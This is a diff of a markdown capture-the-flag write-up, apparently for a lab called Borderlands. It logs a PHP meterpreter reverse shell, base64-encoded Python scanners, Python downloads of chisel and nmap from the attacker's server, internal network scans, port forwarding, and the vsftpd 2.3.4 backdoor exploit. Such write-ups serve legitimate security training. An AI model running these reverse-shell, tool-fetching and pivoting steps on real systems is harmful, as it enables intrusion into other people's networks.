@@ -694,111 +694,271 @@ Payload size: 1113 bytes
 <img width="1125" height="42" alt="image" src="https://github.com/user-attachments/assets/c0da1523-8673-4f6b-ae24-1ad00563d92b" />
 
 
-```bash
-http://TargetIP/shell.php
-```
+<p align="center">Navigated to http://TargetIP/rev.php</p>
 
 ```bash
 msf6 >  use multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set lport 4444
 lport => 4444
-msf6 exploit(multi/handler) > set lhost 10.10.195.74
-lhost => 10.10.195.74
+msf6 exploit(multi/handler) > set lhost xx.xxx.xx.xxx
+lhost => xx.xxx.xx.xxx
 msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
 payload => php/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) > exploit
-[*] Started reverse TCP handler on 10.10.195.74:4444 
+[*] Started reverse TCP handler on xx.xxx.xx.xxx:4444 
 [*] Sending stage (40004 bytes) to 10.10.143.3
 [*] Meterpreter session 1 opened (10.10.195.74:4444 -> 10.10.143.3:45618) at 2025-07-21 00:53:03 +0100
 
-meterpreter > whoami
-[-] Unknown command: whoami. Run the help command for more details.
+meterpreter >
+```
+
+<img width="1254" height="326" alt="image" src="https://github.com/user-attachments/assets/edb6f9d8-0241-4bad-ab29-73673a067119" />
+
+ 
+ 
+```bash
 meterpreter > shell
-Process 539 created.
+Process 494 created.
 Channel 0 created.
 whoami
 www-data
+```
+
+```bash
+pwd
+/var/www/html
+```
+
+```bash
 getent hosts
 127.0.0.1       localhost
 127.0.0.1       localhost ip6-localhost ip6-loopback
 172.18.0.2      app.ctx.ctf app
 172.16.1.10     app.ctx.ctf app
+```
+
+```bash
 ss
-NetidState      Recv-Q Send-Q             Local Address:Port  Peer Address:Port 
-u_strESTAB      0      0                              * 25303            * 25302
-u_strESTAB      0      0                              * 25399            * 25398
-u_strESTAB      0      0                              * 25302            * 25303
-u_strESTAB      0      0                              * 25398            * 25399
-u_strESTAB      8      0       /run/php/php7.2-fpm.sock 35032            * 0    
-tcp  FIN-WAIT-2 0      0                     172.18.0.2:http  10.10.195.74:60320
-tcp  ESTAB      0      0                     172.18.0.2:45618 10.10.195.74:4444 
+NetidState      Recv-Q Send-Q               Local Address:Port     Peer Address:Port                                                                            
+u_strESTAB      0      0                                * 24432               * 24433                                                                           
+u_strESTAB      0      0                                * 24433               * 24432                                                                           
+u_strESTAB      0      0                                * 24576               * 24575                                                                           
+u_strESTAB      0      0                                * 24575               * 24576                                                                           
+u_strESTAB      8      0         /run/php/php7.2-fpm.sock 29202               * 0                                                                               
+tcp  ESTAB      0      0                       172.18.0.2:60066   10.201.76.116:4444                                                                            
+tcp  FIN-WAIT-2 0      0                       172.18.0.2:http    10.201.76.116:41880
+```
+
+```bash
 which python3
 /usr/bin/python3
+```
+
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```bash
 www-data@app:~/html$ ip -s neigh
 ip -s neigh
-172.18.0.1 dev eth0 lladdr 02:42:32:e1:80:54 ref 1 used 0/0/0 probes 1 DELAY
+172.18.0.1 dev eth0 lladdr 02:42:10:d2:44:9e ref 1 used 33/0/28 probes 1 REACHABLE
 ```
 
 <p align="center"><em>arp.py</em></p>
 
 ```bash
-echo 'aW1wb3J0IHNvY2tldAoKZm9yIGkgaW4gcmFuZ2UoMCwgMjU2KToKICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICBzb2NrLnNldHRpbWVvdXQoMC41KQogICAgaXAgPSAnMTcyLjE2LjEue30nLmZvcm1hdChpKQogICAgaWYgMCA9PSBzb2NrLmNvbm5lY3RfZXgoKGlwLCAyMikpOgogICAgICAgIHNvY2suY2xvc2UoKQogICAgICAgIHByaW50KGlwICsgJyAgIE9OJyAsIGZsdXNoPVRydWUpCiAgICBlbHNlOgogICAgICAgIHByaW50KGlwLCAgZmx1c2g9VHJ1ZSkK' | base64 -d > arp.py
+www-data@app:~/html$ echo 'aW1wb3J0IHNvY2tldA0KDQpmb3IgaSBpbiByYW5nZSgwLCAyNTYpOg0KICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgc29jay5zZXR0aW1lb3V0KDAuNSkNCiAgICBpcCA9ICcxNzIuMTguMC57fScuZm9ybWF0KGkpDQogICAgaWYgMCA9PSBzb2NrLmNvbm5lY3RfZXgoKGlwLCAyMikpOg0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgICAgICAgcHJpbnQoaXAgKyAnICAgT04nICwgZmx1c2g9VHJ1ZSkNCiAgICBlbHNlOg0KICAgICAgICBwcmludChpcCwgIGZsdXNoPVRydWUpDQo=' | base64 -d > arp.py
+<udChpcCwgIGZsdXNoPVRydWUpDQo=' | base64 -d > arp.py
 ```
 
-<img width="1066" height="242" alt="image" src="https://github.com/user-attachments/assets/e82cc626-31d8-48f9-a879-c2ebfd9fa87c" />
+
+<img width="1255" height="784" alt="image" src="https://github.com/user-attachments/assets/d34ea431-7a2c-4ddc-8b11-acccbcd7ec6e" />
 
 
 ```bash
-www-data@app:/dev/shm$ python3 arp.py
+www-data@app:/tmp$
+ python3 arp.py
 python3 arp.py
+172.18.0.0
+172.18.0.1   ON
+172.18.0.2
+172.18.0.3
+172.18.0.4
 ...
-www-data@app:/dev/shm$ ip -s neigh
-ip -s neigh
-172.16.1.250 dev eth1  used 11/71/8 probes 6 FAILED
-172.16.1.237 dev eth1  used 18/78/15 probes 6 FAILED
-172.18.0.1 dev eth0 lladdr 02:42:32:e1:80:54 ref 1 used 187/0/182 probes 1 REACHABLE
-172.16.1.254 dev eth1  used 9/69/6 probes 6 FAILED
-172.16.1.241 dev eth1  used 16/76/13 probes 6 FAILED
-172.16.1.232 dev eth1  used 20/80/17 probes 6 FAILED
-172.16.1.245 dev eth1  used 14/74/11 probes 6 FAILED
-172.16.1.236 dev eth1  used 18/78/15 probes 6 FAILED
-172.16.1.231 dev eth1  used 21/81/18 probes 6 FAILED
-172.16.1.249 dev eth1  used 12/72/9 probes 6 FAILED
-172.16.1.240 dev eth1  used 16/76/13 probes 6 FAILED
-172.16.1.235 dev eth1  used 19/79/16 probes 6 FAILED
-172.16.1.253 dev eth1  used 10/70/7 probes 6 FAILED
-172.16.1.244 dev eth1  used 14/74/11 probes 6 FAILED
-172.16.1.239 dev eth1  used 17/77/14 probes 6 FAILED
-172.16.1.230 dev eth1  used 21/81/18 probes 6 FAILED
-172.16.1.128 dev eth1 lladdr 02:42:ac:10:01:80 used 72/72/57 probes 4 STALE
-172.16.1.248 dev eth1  used 12/72/9 probes 6 FAILED
-172.16.1.243 dev eth1  used 15/75/12 probes 6 FAILED
-172.16.1.234 dev eth1  used 19/79/16 probes 6 FAILED
-172.16.1.252 dev eth1  used 10/70/7 probes 6 FAILED
-172.16.1.247 dev eth1  used 13/73/10 probes 6 FAILED
-172.16.1.238 dev eth1  used 17/77/14 probes 6 FAILED
-172.16.1.251 dev eth1  used 11/71/8 probes 6 FAILED
-172.16.1.242 dev eth1  used 15/75/12 probes 6 FAILED
-172.16.1.229 dev eth1  used 22/82/19 probes 6 FAILED
-172.16.1.246 dev eth1  used 13/73/10 probes 6 FAILED
-172.16.1.233 dev eth1  used 20/80/17 probes 6 FAILED
+```
+
+
+```bash
+www-data@app:/tmp$ echo 'IyEvdXNyL2Jpbi9weXRob24zDQppbXBvcnQgc29ja2V0DQppbXBvcnQgc2VsZWN0DQpkZWYgc2NhbihpcCk6DQogIHByaW50KCdcbj09ICcgKyBpcCkNCiAgdHJ5Og0KICAgIGZvciBwb3J0IGluIHJhbmdlKDEsNjU1MzUpOiAgDQogICAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KICAgICAgc29jay5zZXR0aW1lb3V0KDAuMikNCiAgICAgIHJlc3VsdCA9IHNvY2suY29ubmVjdF9leCgoaXAsIHBvcnQpKQ0KICAgICAgaWYgcmVzdWx0ID09IDA6DQogICAgICAgIHNvY2suc2V0YmxvY2tpbmcoMCkNCiAgICAgICAgcmVhZHkgPSBzZWxlY3Quc2VsZWN0KFtzb2NrXSwgW10sIFtdLCAwLjUpDQogICAgICAgIGlmIHJlYWR5WzBdOg0KICAgICAgICAgIGRhdGEgPSBzb2NrLnJlY3YoNDA5NikNCiAgICAgICAgcHJpbnQoIlBvcnQge306ICAgICAgT3BlblxuICB7fSIuZm9ybWF0KHBvcnQsIGRhdGEpKQ0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgIHN5cy5leGl0KCkNCiAgZXhjZXB0IHNvY2tldC5nYWllcnJvcjoNCiAgICBwcmludCgnSG9zdG5hbWUgY291bGQgbm90IGJlIHJlc29sdmVkLicpDQogICAgcmV0dXJuDQogIGV4Y2VwdCBzb2NrZXQuZXJyb3I6DQogICAgcHJpbnQoIkNvdWxkbid0IGNvbm5lY3QgdG8gc2VydmVyLiIpDQogICAgcmV0dXJuDQpzY2FuKCcxNzIuMTguMC4xJyk=' | base64 -d > t.py
 ```
 
 ```bash
-www-data@app:/dev/shm$ echo 'IyEvdXNyL2Jpbi9weXRob24zDQppbXBvcnQgc29ja2V0DQppbXBvcnQgc2VsZWN0DQpkZWYgc2NhbihpcCk6DQogIHByaW50KCdcbj09ICcgKyBpcCkNCiAgdHJ5Og0KICAgIGZvciBwb3J0IGluIHJhbmdlKDEsNjU1MzUpOiAgDQogICAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KICAgICAgc29jay5zZXR0aW1lb3V0KDAuMikNCiAgICAgIHJlc3VsdCA9IHNvY2suY29ubmVjdF9leCgoaXAsIHBvcnQpKQ0KICAgICAgaWYgcmVzdWx0ID09IDA6DQogICAgICAgIHNvY2suc2V0YmxvY2tpbmcoMCkNCiAgICAgICAgcmVhZHkgPSBzZWxlY3Quc2VsZWN0KFtzb2NrXSwgW10sIFtdLCAwLjUpDQogICAgICAgIGlmIHJlYWR5WzBdOg0KICAgICAgICAgIGRhdGEgPSBzb2NrLnJlY3YoNDA5NikNCiAgICAgICAgcHJpbnQoIlBvcnQge306ICAgICAgT3BlblxuICB7fSIuZm9ybWF0KHBvcnQsIGRhdGEpKQ0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgIHN5cy5leGl0KCkNCiAgZXhjZXB0IHNvY2tldC5nYWllcnJvcjoNCiAgICBwcmludCgnSG9zdG5hbWUgY291bGQgbm90IGJlIHJlc29sdmVkLicpDQogICAgcmV0dXJuDQogIGV4Y2VwdCBzb2NrZXQuZXJyb3I6DQogICAgcHJpbnQoIkNvdWxkbid0IGNvbm5lY3QgdG8gc2VydmVyLiIpDQogICAgcmV0dXJuDQpzY2FuKCcxNzIuMTYuMS4xMjgnKQ==' | base64 -d > ports.py
-<mV0dXJuDQpzY2FuKCcxNzIuMTYuMS4xMjgnKQ==' > ports.py
-www-data@app:/dev/shm$ ls
+www-data@app:/tmp$ ls
 ls
 arp.py	ports.py
-www-data@app:/dev/shm$ ls
-ls
-arp.py	ports.py
-www-data@app:/dev/shm$ python3 ports.py
-python3 ports.py
+```
 
-== 172.16.1.128
+```bash
+www-data@app:/tmp$ python3 ports.py
+python3 t.py
+
+== 172.18.0.1
+Port 22:      Open
+  b'SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8\r\n'
+Port 80:      Open
+  b'SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8\r\n'
+python3 ports.py
+```
+
+
+```bash
+
+```
+
+
+
+
+
+www-data@app:/etc$ cat mtab
+cat mtab
+overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/KVBCUFUX47UAB7644MIVUODG2P:/var/lib/docker/overlay2/l/DNNEDZMRFITSDUS6FGAVKZBC3C:/var/lib/docker/overlay2/l/LNYPZBCRBRYPBNFEL7WJXKSHGC:/var/lib/docker/overlay2/l/64NWWAJBZVNVDQXAC7B3QCSJIW:/var/lib/docker/overlay2/l/63GTLCTVONM6BB7C4QR2RPQN7S:/var/lib/docker/overlay2/l/XNFKVROYQCEJH2SVAOCSZPLF4R:/var/lib/docker/overlay2/l/5CN26PMZT7B5TB4MF5MRUKZ42S:/var/lib/docker/overlay2/l/HW5ANSFG3A3N7V4DFC4P6JDGWX:/var/lib/docker/overlay2/l/RX2J4X2T3G4FIUEQJ4H66MXSCG:/var/lib/docker/overlay2/l/Z4JYYRAIMVGGJIORTJNILRKRVO:/var/lib/docker/overlay2/l/L2BIMW2PVJ4TMNP4LLEAUSUCHP:/var/lib/docker/overlay2/l/TAMASXVYRB4LEVDEXVUTR7K5AA:/var/lib/docker/overlay2/l/U6CZBILSES3MSBYGFCWJU2UIII:/var/lib/docker/overlay2/l/7ICSISLE3ZKKN3SFW5FTMKDHXP:/var/lib/docker/overlay2/l/R3TPIJT7XTLI27UICJB3Q6EQIY:/var/lib/docker/overlay2/l/3X7QHVZDTEDWZ473EGB5KBR7IJ:/var/lib/docker/overlay2/l/M3RATIXHSSTEV4TKYNYYV4ML6S:/var/lib/docker/overlay2/l/L4GCHGRHD65QFB36ZAFYAQULQF:/var/lib/docker/overlay2/l/7KDP3P5IIXOXFMDSAEI3NLDTFK:/var/lib/docker/overlay2/l/SQZ5EFAFI3OSJVPRW55EPGID3H:/var/lib/docker/overlay2/l/DDKNYPHBBEFSHZCPTRX4MONWJB:/var/lib/docker/overlay2/l/VCI5PVG4DCELY5IHMAGNQVRQ2M:/var/lib/docker/overlay2/l/O7OR5RLXVSEG7J7JJKEEG6VA26,upperdir=/var/lib/docker/overlay2/99fca206e6eac126b21b6df791a6878a151f0282becd805bf9f1885ed2c2ea03/diff,workdir=/var/lib/docker/overlay2/99fca206e6eac126b21b6df791a6878a151f0282becd805bf9f1885ed2c2ea03/work 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
+devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
+sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
+tmpfs /sys/fs/cgroup tmpfs ro,nosuid,nodev,noexec,relatime,mode=755 0 0
+cgroup /sys/fs/cgroup/systemd cgroup ro,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd 0 0
+cgroup /sys/fs/cgroup/cpuset cgroup ro,nosuid,nodev,noexec,relatime,cpuset 0 0
+cgroup /sys/fs/cgroup/pids cgroup ro,nosuid,nodev,noexec,relatime,pids 0 0
+cgroup /sys/fs/cgroup/memory cgroup ro,nosuid,nodev,noexec,relatime,memory 0 0
+cgroup /sys/fs/cgroup/freezer cgroup ro,nosuid,nodev,noexec,relatime,freezer 0 0
+cgroup /sys/fs/cgroup/blkio cgroup ro,nosuid,nodev,noexec,relatime,blkio 0 0
+cgroup /sys/fs/cgroup/cpu,cpuacct cgroup ro,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
+cgroup /sys/fs/cgroup/net_cls,net_prio cgroup ro,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
+cgroup /sys/fs/cgroup/hugetlb cgroup ro,nosuid,nodev,noexec,relatime,hugetlb 0 0
+cgroup /sys/fs/cgroup/perf_event cgroup ro,nosuid,nodev,noexec,relatime,perf_event 0 0
+cgroup /sys/fs/cgroup/devices cgroup ro,nosuid,nodev,noexec,relatime,devices 0 0
+mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
+/dev/xvda1 /etc/resolv.conf ext4 rw,relatime,discard,data=ordered 0 0
+/dev/xvda1 /etc/hostname ext4 rw,relatime,discard,data=ordered 0 0
+/dev/xvda1 /etc/hosts ext4 rw,relatime,discard,data=ordered 0 0
+shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
+/dev/xvda1 /var/www/flag.txt ext4 rw,relatime,discard,data=ordered 0 0
+proc /proc/bus proc ro,relatime 0 0
+proc /proc/fs proc ro,relatime 0 0
+proc /proc/irq proc ro,relatime 0 0
+proc /proc/sys proc ro,relatime 0 0
+proc /proc/sysrq-trigger proc ro,relatime 0 0
+tmpfs /proc/acpi tmpfs ro,relatime 0 0
+tmpfs /proc/kcore tmpfs rw,nosuid,size=65536k,mode=755 0 0
+tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755 0 0
+tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755 0 0
+tmpfs /proc/timer_stats tmpfs rw,nosuid,size=65536k,mode=755 0 0
+tmpfs /proc/sched_debug tmpfs rw,nosuid,size=65536k,mode=755 0 0
+tmpfs /proc/scsi tmpfs ro,relatime 0 0
+tmpfs /sys/firmware tmpfs ro,relatime 0 0
+www-data@app:/etc$ 
+
+
+
+
+www-data@app:/$ ls -lah
+ls -lah
+total 72K
+drwxr-xr-x   1 root root 4.0K Oct 11  2019 .
+drwxr-xr-x   1 root root 4.0K Oct 11  2019 ..
+-rwxr-xr-x   1 root root    0 Oct 11  2019 .dockerenv
+drwxr-xr-x   1 root root 4.0K Oct  8  2019 bin
+drwxr-xr-x   2 root root 4.0K Apr 24  2018 boot
+drwxr-xr-x   5 root root  340 Aug 31 16:27 dev
+drwxr-xr-x   1 root root 4.0K Oct 11  2019 etc
+drwxr-xr-x   2 root root 4.0K Apr 24  2018 home
+drwxr-xr-x   1 root root 4.0K May 23  2017 lib
+drwxr-xr-x   2 root root 4.0K Sep 12  2019 lib64
+drwxr-xr-x   2 root root 4.0K Sep 12  2019 media
+drwxr-xr-x   2 root root 4.0K Sep 12  2019 mnt
+drwxr-xr-x   2 root root 4.0K Sep 12  2019 opt
+dr-xr-xr-x 189 root root    0 Aug 31 16:27 proc
+drwx------   2 root root 4.0K Sep 12  2019 root
+drwxr-xr-x   1 root root 4.0K Oct 11  2019 run
+drwxr-xr-x   1 root root 4.0K Oct  8  2019 sbin
+drwxr-xr-x   2 root root 4.0K Sep 12  2019 srv
+dr-xr-xr-x  13 root root    0 Aug 31 16:27 sys
+drwxrwxrwt   1 root root 4.0K Aug 31 19:12 tmp
+drwxr-xr-x   1 root root 4.0K Sep 12  2019 usr
+drwxr-xr-x   1 root root 4.0K Oct  8  2019 var
+www-data@app:/$ 
+
+www-data@app:/$ ps -Af
+ps -Af
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 16:27 ?        00:00:00 /bin/bash /sbin/entrypoint.sh
+mysql       41     1  0 16:27 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
+mysql      407    41  0 16:27 ?        00:00:03 /usr/sbin/mysqld --basedir=/usr 
+root       480     1  0 16:27 ?        00:00:00 php-fpm: master process (/etc/ph
+www-data   481   480  0 16:27 ?        00:00:00 php-fpm: pool www
+www-data   482   480  0 16:27 ?        00:00:00 php-fpm: pool www
+root       483     1  0 16:27 ?        00:00:00 nginx: master process nginx -g d
+www-data   484   483  0 16:27 ?        00:00:00 nginx: worker process
+www-data   494   482  0 17:03 ?        00:00:00 [sh] <defunct>
+www-data   529   482  0 17:25 ?        00:00:00 [sh] <defunct>
+www-data   539   482  0 17:30 ?        00:00:00 [sh] <defunct>
+www-data   540     1  0 17:30 ?        00:00:00 /bin/sh
+www-data   541   540  0 17:30 ?        00:00:00 python3 -c import pty; pty.spawn
+www-data   542   541  0 17:30 pts/2    00:00:00 /bin/bash
+www-data   556   482  0 17:40 ?        00:00:00 [sh] <defunct>
+www-data   557     1  0 17:40 ?        00:00:00 /bin/sh
+www-data   558   557  0 17:41 ?        00:00:00 python3 -c import pty; pty.spawn
+www-data   559   558  0 17:41 pts/3    00:00:00 /bin/bash
+www-data   570   482  0 17:44 ?        00:00:00 [sh] <defunct>
+www-data   571     1  0 17:44 ?        00:00:00 /bin/sh
+www-data   572   571  0 17:44 ?        00:00:00 python3 -c import pty; pty.spawn
+www-data   573   572  0 17:44 pts/4    00:00:00 /bin/bash
+www-data   591   482  0 18:07 ?        00:00:00 [sh] <defunct>
+www-data   592     1  0 18:07 ?        00:00:00 /bin/sh
+www-data   614   592  0 18:16 ?        00:00:00 python3 -c import pty; pty.spawn
+www-data   615   614  0 18:16 pts/0    00:00:00 /bin/bash
+www-data   642   615  0 18:32 pts/0    00:00:26 ./nmap -sn -T5 172.18.0.0/16
+www-data   643   482  0 18:34 ?        00:00:00 [sh] <defunct>
+www-data   644     1  0 18:34 ?        00:00:00 /bin/sh
+www-data   645   644  0 18:34 ?        00:00:00 python3 -c import pty;pty.spawn(
+www-data   646   645  0 18:34 pts/1    00:00:00 /bin/bash
+www-data   656   482  0 18:46 ?        00:00:00 [sh] <defunct>
+www-data   657     1  0 18:46 ?        00:00:00 /bin/sh
+www-data   658   657  0 18:46 ?        00:00:00 python3 -c import pty;pty.spawn(
+www-data   659   658  0 18:46 pts/5    00:00:00 /bin/bash
+www-data   665   482  0 19:00 ?        00:00:00 [sh] <defunct>
+www-data   666     1  0 19:00 ?        00:00:00 /bin/sh
+www-data   667   666  0 19:00 ?        00:00:00 python3 -c import pty;pty.spawn(
+www-data   668   667  0 19:00 pts/6    00:00:00 /bin/bash
+www-data   730   668  0 19:17 pts/6    00:00:00 ./netcat 172.16.1.128 179
+www-data   731   482  0 19:18 ?        00:00:00 sh -c /bin/sh 
+www-data   732   731  0 19:18 ?        00:00:00 /bin/sh
+www-data   733   732  0 19:19 ?        00:00:00 python3 -c import pty; pty.spawn
+www-data   734   733  0 19:19 pts/7    00:00:00 /bin/bash
+www-data   756   734  0 19:29 pts/7    00:00:00 ps -Af
+
+
+ps -eo pid,cmd
+  PID CMD
+    1 /bin/bash /sbin/entrypoint.sh
+   41 /bin/sh /usr/bin/mysqld_safe
+  407 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr
+  480 php-fpm: master process (/etc/php/7.2/fpm/php-fpm.conf)
+  481 php-fpm: pool www
+  482 php-fpm: pool www
+  483 nginx: master process nginx -g daemon off;
+  484 nginx: worker process
+
+
+
+
+
+
+
+
+== 172.18.0.1
 Port 21:      Open
   b'220 (vsFTPd 2.3.4)\r\n'
 Port 179:      Open
@@ -809,6 +969,147 @@ Port 2605:      Open
 ...
 ```
 
+
+
+import urllib.request
+
+url= "http://10.201.76.116:8000/chisel"
+urllib.request.urlretrieve(url, "chisel")
+
+
+<img width="1129" height="148" alt="image" src="https://github.com/user-attachments/assets/725533fa-d91d-4cac-940f-d5821044453d" />
+
+
+
+www-data@app:~/html$ python3 d.py
+python3 d.py
+www-data@app:~/html$ 
+
+root@ip-10-201-76-116:~/Borderlands# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.201.90.105 - - [31/Aug/2025 19:24:24] "GET /chisel HTTP/1.1" 200 -
+
+
+
+
+import urllib.request
+
+url= "http://10.201.76.116:8000/nmap-x64.tar.gz"
+urllib.request.urlretrieve(url, "nmap.tar.gz")
+
+
+
+www-data@app:~/html$ python3 n.py
+python3 n.py
+www-data@app:~/html$
+
+
+
+:~/Borderlands# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.201.90.105 - - [31/Aug/2025 19:26:46] "GET /nmap-x64.tar.gz HTTP/1.1" 200 -
+
+
+
+www-data@app:~/html$ tar -xf nmap.tar.gz
+nmap
+
+
+
+./nmap 172.18.0.0/24
+Starting Nmap 7.91 ( https://nmap.org ) at 2025-08-31 18:38 UTC
+Nmap scan report for ip-172-18-0-1.ec2.internal (172.18.0.1)
+Host is up (0.00075s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Nmap scan report for app.ctx.ctf (172.18.0.2)
+Host is up (0.000084s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 256 IP addresses (2 hosts up) scanned in 8.19 seconds
+www-data@app:~/html$ 
+
+
+
+www-data@app:~/html$ ./nmap 172.16.1.0/24
+./nmap 172.16.1.0/24
+Starting Nmap 7.91 ( https://nmap.org ) at 2025-08-31 18:36 UTC
+Nmap scan report for app.ctx.ctf (172.16.1.10)
+Host is up (0.00012s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap scan report for hackback_router1_1.hackback_r_1_ext (172.16.1.128)
+Host is up (0.00013s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+179/tcp  open  bgp
+2601/tcp open  zebra
+2605/tcp open  bgpd
+
+Nmap done: 256 IP addresses (2 hosts up) scanned in 2.52 seconds
+www-data@app:~/html$ 
+
+
+
+
+
+
+
+
+
+
+
+meterpreter > shell
+Process 588 created.
+Channel 7 created.
+ip route show
+default via 172.18.0.1 dev eth0 
+172.16.1.0/24 dev eth1 proto kernel scope link src 172.16.1.10 
+172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 
+
+
+
+Terminate channel 6? [y/N]  y
+meterpreter > portfwd add -l 21 -p 21 -r 172.18.0.1
+[*] Forward TCP relay created: (local) :21 -> (remote) 172.18.0.1:21
+
+
+
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+[*] 127.0.0.1:21 - Banner: 
+
+
+
+
+
+:~/Borderlands# cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe nc.exe
+
+
+
+meterpreter > upload nc.exe
+[*] Uploading  : /root/Borderlands/nc.exe -> nc.exe
+[*] Uploaded -1.00 B of 27.50 KiB (-0.0%): /root/Borderlands/nc.exe -> nc.exe
+[*] Completed  : /root/Borderlands/nc.exe -> nc.exe
+meterpreter > 
+
+
+
+
+
+
 ```bash
 cat /etc/mtab
 ...
@@ -818,29 +1119,20 @@ cat /etc/mtab
 shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
 /dev/xvda1 /var/www/flag.txt ext4 rw,relatime,discard,data=ordered 0 0
 ...
-ls -a /
-.
-..
-.dockerenv
-bin
-boot
-dev
-etc
-home
-lib
-lib64
-media
-mnt
-opt
-proc
-root
-run
-sbin
-srv
-sys
-tmp
-usr
-var
+
+
+www-data@app:/$ ls
+ls
+bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
+boot  etc  lib	 media	opt  root  sbin  sys  usr
+
+
+ID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 16:27 ?        00:00:00 /bin/bash /sbin/entrypoint.sh
+mysql       41     1  0 16:27 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
+mysql      407    41  0 16:27 ?        00:00:01 /usr/sbin/mysqld --basedir=/usr 
+root       480     1  0 16:27 ?        00:00:00 php-fpm: master process (/etc/ph
+
 ...
 ps -Af
 UID        PID  PPID  C STIME TTY          TIME CMD
@@ -848,9 +1140,15 @@ root         1     0  0 Jul20 ?        00:00:00 /bin/bash /sbin/entrypoint.sh
 mysql       41     1  0 Jul20 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
 mysql      427    41  0 Jul20 ?        00:00:04 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306 --log-syslog=1 --log-syslog-facility=daemon --log-syslog-tag=
 root       518     1  0 Jul20 ?        00:00:00 php-fpm: master process (/etc/php/7.2/fpm/php-fpm.conf)
+
+
+
 www-data   519   518  0 Jul20 ?        00:00:00 php-fpm: pool www
 www-data   520   518  0 Jul20 ?        00:00:00 php-fpm: pool www
 root       521     1  0 Jul20 ?        00:00:00 nginx: master process nginx -g daemon off;
+
+
+www-data@app:/$ ip addr
 ip addr
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -860,14 +1158,19 @@ ip addr
     link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
     inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
        valid_lft forever preferred_lft forever
-19: eth1@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default 
+19: eth1@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default 
     link/ether 02:42:ac:10:01:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
     inet 172.16.1.10/24 brd 172.16.1.255 scope global eth1
        valid_lft forever preferred_lft forever
-       ip route show
+
+
+
+
 default via 172.18.0.1 dev eth0 
 172.16.1.0/24 dev eth1 proto kernel scope link src 172.16.1.10 
-172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 
+172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2
+
+
 cat /sbin/entrypoint.sh
 #!/bin/bash
 
@@ -880,6 +1183,8 @@ service php7.2-fpm start
 #service nginx start
 nginx -g "daemon off;"
 ```
+
+
